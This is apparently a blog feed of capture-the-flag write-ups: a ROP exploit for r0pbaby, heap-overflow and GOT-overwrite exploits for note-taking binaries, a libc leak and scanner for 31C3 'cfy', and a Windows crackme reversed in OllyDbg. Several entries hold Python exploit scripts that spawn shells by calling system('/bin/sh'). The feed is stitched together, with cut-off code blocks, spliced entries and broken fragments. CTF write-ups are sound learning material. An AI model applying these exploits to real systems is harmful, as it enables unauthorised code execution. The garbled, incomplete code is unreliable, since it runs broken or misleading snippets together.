    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
</code></pre>

<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<pre><code class="python">import socket, struct, re, time

def p(x):
    return struct.pack('&lt;Q', x)

def get_function(s, name):
    s.send('2\n')
    s.send(name+'\n')
    time.sleep(0.50)
    data = s.recv(1000)

    m = re.findall('(0x0000.*)', data)
    print m
    return int(m[0], 16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))

print s.recv(1000)
print s.recv(1000)

# get some address where we'll store the shellcode
SYSTEM = get_function(s, "system")
READ = get_function(s, "read")
MPROTECT = get_function(s, "mprotect")

# this offset was found like so:
# $ nm -D ./libc-2.19.so |grep mprotect

LIBC_BASE = MPROTECT - 0xf4a20

print "[!] libc_base  = 0x%X" % LIBC_BASE
print "[!] system()   = 0x%X" % SYSTEM
print "[!] read()     = 0x%X" % READ
print "[!] mprotect() = 0x%X" % MPROTECT

POPRDX = LIBC_BASE + 0x000bcee0
POPRAX = LIBC_BASE + 0x00048858
POPRSI = LIBC_BASE + 0x00024805
POPRDI = LIBC_BASE + 0x00022b1a
SYSCAL = LIBC_BASE + 0x000c1e55
MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret

# kick off ROP chain
s.send('3\n')
print s.recv(1000)


# build ROP chain
# first, mprotect() a certain area
payload = "A"*8
payload += p(POPRDX)
payload += p(7)
payload += p(POPRSI)
payload += p(0x1000)
payload += p(POPRDI)
payload += p(LIBC_BASE)

# thirdly, write '//sh' to memory
payload += p(POPRDX)
payload += p(0x68732f2f)
payload += p(POPRAX)
payload += p(LIBC_BASE+4)
payload += p(MOVMEM)

# finally, return-to-system and invoke a shell
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(SYSTEM)

length = "%d" % (len(payload)+1)
print "[!] sending " + length + " bytes"
s.send(length + '\n')

time.sleep(0.5)
s.send(payload + '\n')

print s.recv(1000)

# interact with the shell

t.sock = s
t.interact()
s.close()
</code></pre>

<p>Putting it all together:</p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>

    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<pre><code>~/tmp/nullcon/exp400$ ./MentalNote

Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
</code></pre>

<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<pre><code>gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000

</code></pre>

<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<pre><code class="c">struct note {
    note *next_note;
    note *prev_note;
    char note_content[MAX_LENGTH];
};
</code></pre>

<p>I sent a stupidly large input to overflow these notes:</p>

</code></pre>

<p>The heap for note two now looks like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949

</code></pre>

<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
&lt;snip&gt;
0x0804c000 0x0804e000 rwxp  [heap]
</code></pre>

<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<pre><code class="python">import struct

<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

</code></pre>

<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<pre><code class="c">note_info struct {
    char name[16];
    int length;
    char *content;
    note_info *next_note;
    note_info *prev_note;
};
</code></pre>

<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<pre><code># local binary
85850c8-122-b75c77b0-122-85850a0-85850a0-63... &lt;snip&gt;
</code></pre>

<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<pre><code># remote binary
83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... &lt;snip&gt;
936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... &lt;snip&gt;
</code></pre>

<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

</code></pre>

<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<pre><code class="bash">LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
</code></pre>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

    <updated>2014-12-29T12:06:07+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy</id>
    <content type="html"><![CDATA[<p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3$ nc 188.40.18.73 3313
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
</code></pre>

<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak a <code>libc</code> address from the GOT. I chose to leak <code>printf</code> because I figured that one would have been resolved by the time our input was handled.</p>

<p>Finding the address of <code>printf</code> pointer in GOT was done like this:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ objdump -d -M intel ./cfy |grep "printf" -A2 
00000000004005e0 &lt;printf@plt&gt;:
  4005e0:   ff 25 3a 0a 20 00       jmp    QWORD PTR [rip+0x200a3a]        # 601020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;
  4005e6:   68 01 00 00 00          push   0x1
</code></pre>

<p>So the pointer to <code>printf</code> is located at <code>0x601020</code> in the binary. This script grabs that value via the &ldquo;parse from pointer&rdquo; option:</p>

<pre><code class="python">#!/usr/bin/python

import struct 
import time
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))


def p(x):
    return struct.pack("L", x)

addr = 0x601020

payload = ""
payload += "2\n"
payload += p(addr)  # printf
payload += "\n"

print s.recv(1000)
s.send(payload)
time.sleep(0.5)
print s.recv(1000)
</code></pre>

<p>Which gives us the output:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python read.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140512731112416
hex: 0x7fcbab6ca3e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
</code></pre>

<p>Unfortunately, running the python script again shows a different address for <code>printf</code>. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>

<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>

<pre><code>  4008af: 48 c1 e0 04           shl    rax,0x4         ; multiply value by 16
  4008b3: 48 05 80 10 60 00     add    rax,0x601080    ; address of parsers, see below
  4008b9: 48 8b 00              mov    rax,QWORD PTR [rax]
  4008bc: bf e0 10 60 00        mov    edi,0x6010e0    ; address of buf, see below
  4008c1: ff d0                 call   rax             ; gain code exec here!
</code></pre>

<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>

<pre><code>gdb-peda$ p parsers
$1 = { {
    fn = 0x40073d &lt;from_hex&gt;, 
    desc = 0x4009b4 "parse from hex"
  }, {
    fn = 0x400761 &lt;from_dec&gt;, 
    desc = 0x4009c3 "parse from dec"
  }, {
    fn = 0x400785 &lt;from_ptr&gt;, 
    desc = 0x4009d2 "parse from pointer"
  } }
</code></pre>

<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>

<pre><code class="">gdb-peda$ x/40wx parsers

<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>

<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>

<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>

<pre><code>bas@tritonal:~/tmp/31c3/cfy$ gdb ./libc-2.19.so 
GNU gdb (GDB) 7.4.1-debian
...snip...
gdb-peda$ x/8b system
0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
</code></pre>

<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>

<pre><code class="python">#!/usr/bin/python

import struct, time, re

def p(x):
    return struct.pack("L", x)

payload = ""
payload += "2\n"
payload += p(0x601020)  # printf
payload += "\n"

import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(1.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

OFFSET=63580    # guesstimated from real libc
for i in range(5000):
    payload = ""
    payload += "2\n"
    payload += p(int(PRINTF, 16)-OFFSET-i)
    payload += "\n"

    s.send(payload)

    data = s.recv(200)
    print data
    print i

    if 'ff85' in data: # part of test rdi, rdi
            print "[!] found possible offset for system(): printf-%d" % (int(PRINTF,16)-(int(PRINTF, 16)-OFFSET-i))
            print "[!] system @ %s" % hex(int(PRINTF, 16)-OFFSET-i)
            raw_input()
</code></pre>

<p>It gave a lot of possible addresses, and once I thought I had <code>system()</code> but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:</p>

<pre><code>...snip...
85
[!] found possible offset for system(): printf-63665
[!] system @ 0x7f4df0086b2f

86
[!] found possible offset for system(): printf-63666
[!] system @ 0x7f4df0086b2e
</code></pre>

<p>At <code>printf-63665</code>, libc indeed has the first few bytes of <code>system()</code>. It started with a <code>00</code> byte, so I decreased the value by one and plugged that value into a script.</p>

<pre><code class="python">#!/usr/bin/python

import struct, time, re, telnetlib, socket

def p(x):
    return struct.pack("L", x)

# leak printf address in libc via GOT pointer
payload = ""

payload += p(0x601020)  # printf@plt
payload += "\n"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(0.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

print "[+] found printf: %x" % int(PRINTF, 16)
SYSTEM = int(PRINTF, 16) - 63664
print "[+] system at %x" % int(SYSTEM)

# spam system into buf
payload = ""
payload += "1\n"        
payload += p(SYSTEM)    # address of system() will be stored in buf
payload += p(SYSTEM)    # buf+8

    <content type="html"><![CDATA[<p>Someone passed me a binary and said &lsquo;Here, you&rsquo;ll enjoy this one&rsquo;. I most certainly did&hellip;</p>

<!-- more -->


<p>The guy also gave one hint, which I needed later. I started checking out the binary, which turned out to be a 32-bit Windows PE executable. I downloaded <a href="http://modern.ie">an XP VM</a> and an old, familiar friend: <a href="http://www.ollydbg.de">OllyDbg 1.10</a>, arguably the best debugger for Windows.</p>

<p>Starting up the binary, I was presented with a simple dialog:</p>

<p><img src="/assets/hv14/hv14-00.png" alt="" /></p>

<p>I tried entering a string to check, but it didn&rsquo;t do anything. I set a few breakpoints, but when I switched back to the dialog, the binary crashed!</p>

<p><img src="/assets/hv14/hv14-01.png" alt="" /></p>

<p>What was going on here? <code>IsDebuggerPresent</code> was not referenced in the code, but maybe something else was going on. I set a memory breakpoint on a piece of code where I previously had set a breakpoint and pressed F9.</p>

<p><img src="/assets/hv14/hv14-02.png" alt="" /></p>

<p>Then, the binary stopped here:</p>

<p><img src="/assets/hv14/hv14-03.png" alt="" /></p>

<p>Quite interesting! The binary checks itself for <code>0xCC</code> bytes, aka <code>INT 3</code>. There were two of those checks, one at <code>0x4025e0</code> and one at <code>0x402536</code>. I modified the following <code>JNZ</code> to a <code>JMP</code> so the code would never do anything when it found a breakpoint. Now I could set breakpoints where ever I liked!</p>

<p>Back to the <code>SendDlgItemMessageA</code> calls.</p>

<p><img src="/assets/hv14/hv14-04.png" alt="" /></p>

<p>The binary checks the length of our input and if it is exactly <code>0x1D</code> or 29 bytes, it continues by fetching the input. It checks the input for <code>-</code> characters at specific places. From this I deduced that the format of the input should be <code>ABCD-DEFG-HIJK-LMNO-PQRS-TUVW</code>. I entered that and pressed check, ending up here:</p>

<p><img src="/assets/hv14/hv14-06.png" alt="" /></p>

<p>The code now sends a message to its message queue, but I didn&rsquo;t know the location of the handler. No worries; I stepped into the call with F7 until I was in NTDLL.dll, and then set a memory breakpoint on the code area at <code>0x401000</code>. A break-on-access also works.</p>

<p><img src="/assets/hv14/hv14-07.png" alt="" /></p>

<p>After pressing F9, this landed me at the handler!</p>

<p><img src="/assets/hv14/hv14-08.png" alt="" /></p>

<p>I traced through this function with F7, finally ending up here:</p>

<p><img src="/assets/hv14/hv14-09.png" alt="" /></p>

<p>The code takes the first four bytes of our input, XORs them with a certain value and then proceeds to call the code at the resulting value&hellip; Only problem is, there was no code at <code>0x703234BD</code>! I remembered the hint I got at the beginning: &ldquo;the flag probably starts with <code>HV14</code>&rdquo;. I changed the input to <code>HV14-ABCD-DEFG-HIJK-LMNO-PQRS</code> and restarted it again, to end up at the same CALL EAX:</p>

<p><img src="/assets/hv14/hv14-10.png" alt="" /></p>

<p>With a single F7, I ended up here:</p>

<p><img src="/assets/hv14/hv14-11.png" alt="" /></p>

<p>Here, some tricky stuff starts happening! A call to <code>VirtualProtect</code> makes the code in front of us writeable, and the binary starts modifying that code:</p>

<p><img src="/assets/hv14/hv14-12.png" alt="" /></p>

<p>Cool <em>and</em> a nice anti-disassembler tactic, this self-modifying code. It can be tricky to reverse, in this case especially the call that emerges:</p>

<p><img src="/assets/hv14/hv14-13.png" alt="" /></p>

<p>Carefully using F7, I traced passed this anti-disassembler trick and found myself at this CALL ECX:</p>

<p><img src="/assets/hv14/hv14-14.png" alt="" /></p>

<p>I stepped into it, landing at this position. Now it becomes really interesting, the binary apparently calls a function that does <em>something</em> with our input, then sends another message to the message queue. I decided to place a breakpoint at <code>0x4022B3</code> and pressed F9; I would examine the function later. First see what happens:</p>

<p><img src="/assets/hv14/hv14-15.png" alt="" /></p>

<p>Indeed, we land at the message handler. After decrypting a string, the binary does a byte-by-byte comparison of our mangled input and some other buffer:</p>

<p><img src="/assets/hv14/hv14-17.png" alt="" /></p>

<p>The code that comes after it congratulates us, but only if the buffer equals our mangled input. I decided to find out where our input was being mangled. I restarted the binary and set a memory breakpoint on the first four bytes of the input:</p>

<p><img src="/assets/hv14/hv14-18.png" alt="" /></p>

<p>Pressing F9, the code breaks at the CALL EAX, of course. Another F9 lands us here:</p>

<p><img src="/assets/hv14/hv14-19.png" alt="" /></p>

<p>Ah! The first byte of our input, &lsquo;H&rsquo;, is being XOR&#8217;ed with another value. This is repeated for all the bytes in the input:</p>

<p><img src="/assets/hv14/hv14-20.png" alt="" /></p>

<p>I wrote down (literally!) all the values that were used in <code>AL</code> and finally, I ended up at the REPE CMPS instruction:</p>

<p><img src="/assets/hv14/hv14-21.png" alt="" /></p>

<p>I took note of the values at <code>EDI</code> and together with the values from the XOR statement earlier, I had all the thing necessary to grab the flag! Sprinkle in some Python magic:</p>

<p><img src="/assets/hv14/hv14-22.png" alt="" /></p>

<p>And we have the flag!</p>

<p><img src="/assets/hv14/hv14-23.png" alt="" /></p>

<p>It has been a while since I got to use OllyDbg to reverse a Windows binary. Between the self-modifying code, the use of the flag and <code>SendMessage</code> to control code execution, this was a very enjoyable challenge!</p>
